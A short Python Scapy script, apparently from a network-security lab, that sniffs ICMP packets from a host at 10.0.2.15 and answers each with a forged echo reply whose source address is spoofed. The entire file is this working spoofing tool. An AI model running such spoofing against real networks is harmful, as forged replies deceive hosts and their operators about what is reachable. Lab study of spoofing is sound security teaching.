#!/usr/bin/python3
from scapy.all import *

print("Sniffing and spoofing packets ...")

def spoof_pkt(pkt):
    print("Original packet ...")
    pkt.show()

    #spoof and send a response

    print("spoofed packet ...")
    srcip = pkt[IP].dst
    dstip = pkt[IP].src
    new_ihl = pkt[IP].ihl
    new_type = 0
    new_id = pkt[ICMP].id
    new_seq = pkt[ICMP].seq
    new_data = pkt[Raw].load

    new_pkt=IP(src=srcip,dst=dstip,ihl=new_ihl)/ICMP(type=new_type,id=new_id,seq=new_seq)/new_data
    new_pkt.show()

    send(new_pkt,verbose=0)

# capture ICMP packets from 10.0.2.15
pkt = sniff(filter='icmp and src host 10.0.2.15', prn=spoof_pkt)

